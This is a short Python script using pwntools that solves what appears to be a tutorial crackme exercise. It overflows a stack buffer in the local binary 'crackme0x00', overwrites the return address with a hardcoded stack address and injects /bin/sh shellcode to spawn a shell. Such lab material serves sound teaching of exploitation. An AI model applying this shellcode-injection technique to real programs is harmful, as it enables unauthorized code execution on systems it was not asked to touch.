from pwn import *


def exploit():
    context.update(arch='i386', os='linux')
    shellcode = shellcraft.sh()
    print(shellcode)
    print(asm(shellcode))
    payload = cyclic(cyclic_find(0x61616166))
    payload += p32(0xffffd8b0)
    payload += asm(shellcode)
    print(payload)
    p = process('./crackme0x00', cwd='/home/user/tut01-crackme')
    #gdb.attach(p, '''
    #echo "hello"
    ## break *0xffffd8b0
    #continue
    #''')
    p.sendline(payload)
    p.recvline()


if __name__=='__main__':
    exploit()
